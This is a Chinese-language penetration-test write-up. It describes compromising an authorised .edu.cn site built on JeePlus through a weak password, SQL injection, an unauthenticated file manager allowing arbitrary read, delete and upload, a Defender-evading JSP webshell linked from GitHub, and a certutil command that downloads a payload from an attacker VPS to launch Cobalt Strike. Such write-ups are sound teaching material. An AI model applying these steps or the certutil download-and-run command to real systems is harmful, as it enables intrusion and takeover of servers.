# 0x01 前言

碰到了一个对外宣传是否安全的站点，但实际测试下来并不安全。不过在这次获取权限的过程中还是有点曲折，记录下来并分享给大家。  
**整个测试过程均在授权的情况下完成，漏洞详细已经提交并通告相关知情。**

# 0x02 过程

### 1\. 进入

https://xxx.edu.cn/a/login  
使用弱口令进行登陆

### 2\. 寻找上传点

进来后找到一处文件上传的地方进行测试

![](../Images/670abd3c9288d1e54cc2306e274e2580.png)

前端对上传的文件类型做了初步校验，这里我们上传一个空文本后抓包

![](../Images/92656827fe357ddbc5b8560a6f7c7caf.png)

发现路径可以被操控，而且返回了绝对路径。

![](../Images/299fd304cd4282d3b8e557083ee1b10d.png)

尝试访问后发现不能被解析只能下载。

![](../Images/2c72d9b53aec202d030147f5ff9d7b11.png)

再次寻找上传点，发现有头像上传的地方。这种上传点一般都能被解析。

![](../Images/034724a028c9ae093d92ec561048db9e.png)

上传正常图片

![](../Images/974c3b54048ed1f1af962c095b47200f.png)

返回了上传成功的提示，但没发现返回的地址。

![](../Images/36e22c54d344ce81dc430b95b6a9aee7.png)

而后在个人资料出发现了图片地址

![](../Images/76f34cdaa8428b04533a48b5ae475677.png)

我们再次尝试构造请求报文重发，这里直接将后缀改成 jsp 上传成功

![](../Images/23900ea70c9cf14da3206cfeb958394f.png)

刷新个人信息，找到访问链接。发现仍然是只能下载。

![](../Images/968b080b136dc9e9802bb1f194915464.png)

### 3.突破口

![](../Images/ef5d351bca2c6626c77da0f2f996a4e9.png)

我在 Cookie 中发现 jeeplus 的字眼，尝试搜索 getshell 方法

![](../Images/40d715810529146011ec6c1cae1bdfd6.png)

发现早已有前辈做过代码审计。

#### 1）SQL注入

```
/a/sys/register/registerUser?roleName=wangba&mobile=
```

更具已有的 poc 进行尝试 sqlmap 跑起来，`*`号的地方是注入点。

![](../Images/00d65b745f36b743517c8ec7c795bed2.png)

通过 sqlmap 跑出来是 oracle 数据库。尝试一些查询和提权无果放弃。注意，oracle 注入的 sql shell 只能做查询语句。

![](../Images/a1fbaf0f2d2a5fc6dca3c64fa49e3418.png)

#### 2）文件管理

直接访问 https://xxx.edu.cn/a/sys/file 就能越权进入到文件管理页面

![](../Images/10486c4d78ff7ca26132707e03de2d44.png)

这个目录下面的文件都只能下载，我们对这里的文件上传、删除、下载都做了测试。

##### a. 任意文件读取

下载接口可以返回文件内容，存在任意文件读取。

![](../Images/305f29cf9637e0da4192149363154288.png)

![](../Images/2fa081e60b5d776302f3331c75302c42.png)

##### b.任意文件删除

这里甚至可以直接删除文件夹

![](../Images/d37a66cf3dcbf0ba0b3eac69b34f21c1.png)

![](../Images/9e2277f1afc71f766a785b65ca34c745.png)

##### c. 任意文件上传

![](../Images/68c55779ea34622882fa76b0733634d7.png)

![](../Images/2ee8f8839abfd371651fb9f889760ab6.png)  
这里可以自定义上传路径，如果路径不存在则创建目录并上传。

#### 3）尝试上传文件到可解析目录

我第一时间想到上传到 static 目录，因为这个目录是可以被直接访问的。

![](../Images/703c1d7826fc041a41c2b993c38a3a06.png)

然后尝试访问仍然是 404。

![](../Images/e979aaba9970c6e098358f15504d90e6.png)

这里就是我没有找到真确的路径。想去官网直接下载源码，点击下载后回要求注册，注册之后也没有发现哪里有下载源码的地方。

![](../Images/9b5fa3236df1846a2f304d087931029f.png)

没办法就去凌风云网盘搜了一下，发现存在历史的版本，我感觉差异应该不会那么大。

![](../Images/5e93bb337321e739688b2b0acd94975e.png)

挑了一个比较大文件的下载，解压后可以查看目录结构。

![](../Images/2b7325b75ae93fc05fc4082bc8e49bae.png)

看到有存放配置文件的地方，我想看看能不能通过读取配置来找到绝对路径。

![](../Images/fc8710fadf454166fd043e41e686db80.png)

结果还是路径不对。一番尝试后无果，突然想起来站点的目录还没扫过，直接 dirsearch 来一波。

![](../Images/8c656d6e38dd3d43eb7c8eea2a047b26.png)

当我看到扫出来 web.xml 这些配置文件我就知道有戏了。

![](../Images/ccd79555ee8eb270c256233e0334c52d.png)

在 web.xml 中没有发现东西，但是在 `conf/server.xml` 发现了站点的另一个路径，我觉得这就是前端访问的路径。

![](../Images/005b74062ba08bb2e7571346e45d8500.png)

通过任意文件接口尝试构造路径 `C:\tomcat\webapps\xxxx\WEB-INF\web.xml` 发现有内容返回说明我找对了路径，然后发现了 404.jsp 存放的路径，对比我们之前拿到的源码发现我们成功找对了路径——上传文件到 `webpage` 这个目录**绝对能解析**。

![](../Images/b30b6df7ec46e3eaed92f95d0c85813d.png)

尝试直接上传 webshell。

![](../Images/4ad882ba0b1ed10c01e90f3dd892d73f.png)

发现文件真实存在，但是没有返回东西，我用任意文件读取查看。

![](../Images/746687d14c34e0e89f6f4a894fa085fc.png)

#### 4）免杀绕过WD检测

发现可能存在waf，但我后面对waf做了识别发现是 apache generic，这个不至于拦截我传的。再用 nmap 对机器做识别发现是 window10，让我想起了被 windows Defender支配的恐惧，不过这里我们找个命令免杀马子上传即可，找了一番之后用了以前 hw 碰到的一个马子。

https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/Runtime-reflect-cmd.jsp

![](../Images/76a8367275cb263c53d3608cc476599d.png)

#### 5）上线 CS

成功上传并执行命令，原本想通过 powershell 上线，但是尝试过不同的命令包括免杀命令都不行。

然后我通过远程下载我的面杀马子上线 CS `certutil -urlcache -split -f http://VPS/免杀马子.exe`

![](../Images/a17e86868d08e4791e0b637d528d3380.png)  
成功上线。

![](../Images/45dad5be041ee00fda1715549cc5b37b.png)

代理出来之后进入桌面，发现果然开启了 WD

![](../Images/bad884e68010bfa51f770ed02525a0d2.png)

~上机之后才知道，原来管理员把上传文件夹路径放到F盘，主体是C盘，估计就是怕内存不够吧。~

# 0x03 总结

碰到没有思路的站点就做好信息收集扩大攻击面。指纹识别、端口扫描、路径扫描都是老生常谈的了，这次还结合了公网网盘信息泄露的点，不然我还得继续猜路径。还有一点需要注意的是，测试的前提是**取得相关授权**。
